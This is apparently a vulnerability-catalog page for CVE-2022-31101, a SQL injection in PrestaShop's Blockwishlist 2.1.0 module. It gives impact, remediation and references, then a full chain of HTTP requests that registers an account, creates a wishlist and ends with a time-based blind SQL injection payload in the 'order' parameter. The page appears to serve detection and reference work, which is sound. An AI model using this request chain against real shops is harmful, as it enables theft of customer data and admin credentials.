---
layout: "post"
cve_id: "CVE-2022-31101"
title: "Prestashop Blockwishlist 2.1.0 SQL Injection"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-31101.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-31101.yaml"
author: "mastercho"
severity: "high"
impact: "Authenticated attackers can exploit SQL injection in the Blockwishlist module to extract sensitive database information including customer details, order data, and admin credentials from the PrestaShop database.
"
remediation: "Update Prestashop Blockwishlist module to a version newer than 2.1.0 that properly sanitizes user input and uses parameterized queries.
"
reference:
  - "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31101"
  - "https://github.com/PrestaShop/blockwishlist/security/advisories/GHSA-2jx3-5j9v-prpp"
  - "https://packetstormsecurity.com/files/168003/Prestashop-Blockwishlist-2.1.0-SQL-Injection.html"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N', 'cvss-score': 8.1, 'cve-id': 'CVE-2022-31101', 'cwe-id': 'CWE-89', 'epss-score': 0.51662, 'epss-percentile': 0.97795, 'cpe': 'cpe:2.3:a:prestashop:blockwishlist:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 8, 'vendor': 'prestashop', 'product': 'blockwishlist'}"
tags:
  - "packetstorm"
  - "cve"
  - "cve2022"
  - "prestashop"
  - "prestashop-module"
  - "sqli"
  - "intrusive"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Prestashop Blockwishlist module version 2.1.0 suffers from a remote authenticated SQL injection vulnerability.


## üåê HTTP Request
```nohighlight
GET /modules/blockwishlist/config.xml HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /login?create_account=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.7.20) Gecko/ Firefox/3.6.2
Content-Length: 134
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

id_gender=1&firstname=zyzn&lastname=xruv&email=SMJwBo@Utodw.com&password=WwEO8w5A&birthday=&customer_privacy=1&psgdpr=1&submitCreate=1
```

```nohighlight
POST /en/login?create_account=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15
Content-Length: 134
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

id_gender=1&firstname=zyzn&lastname=xruv&email=SMJwBo@Utodw.com&password=WwEO8w5A&birthday=&customer_privacy=1&psgdpr=1&submitCreate=1
```

```nohighlight
POST /fr/login?create_account=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.4.24
Content-Length: 134
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

id_gender=1&firstname=zyzn&lastname=xruv&email=SMJwBo@Utodw.com&password=WwEO8w5A&birthday=&customer_privacy=1&psgdpr=1&submitCreate=1
```

```nohighlight
POST /de/login?create_account=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.2 Safari/537.36
Content-Length: 134
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

id_gender=1&firstname=zyzn&lastname=xruv&email=SMJwBo@Utodw.com&password=WwEO8w5A&birthday=&customer_privacy=1&psgdpr=1&submitCreate=1
```

```nohighlight
POST /pl/login?create_account=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Length: 134
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

id_gender=1&firstname=zyzn&lastname=xruv&email=SMJwBo@Utodw.com&password=WwEO8w5A&birthday=&customer_privacy=1&psgdpr=1&submitCreate=1
```

```nohighlight
POST /es/login?create_account=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36
Content-Length: 134
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

id_gender=1&firstname=zyzn&lastname=xruv&email=SMJwBo@Utodw.com&password=WwEO8w5A&birthday=&customer_privacy=1&psgdpr=1&submitCreate=1
```

```nohighlight
GET /module/blockwishlist/action?action=getAllWishlist HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/3.6.14
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /module/blockwishlist/action?action=createNewWishlist&params[name]=123 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /module/blockwishlist/action?action=getAllWishlist HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.13 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /module/blockwishlist/action?action=addProductToWishlist&params[id_product]=HWXuLz&params[idWishList]=GcVPya&params[quantity]=1&params[id_product_attribute]=0 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10
Connection: close
Content-Length: 0
Accept-Encoding: gzip
```

```nohighlight
GET /module/blockwishlist/view?id_wishlist=GcVPya&order=p.name,%20(select%20case%20when%20(1=1)%20then%20(SELECT%20SLEEP(7))%20else%201%20end);%20--%20.asc HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

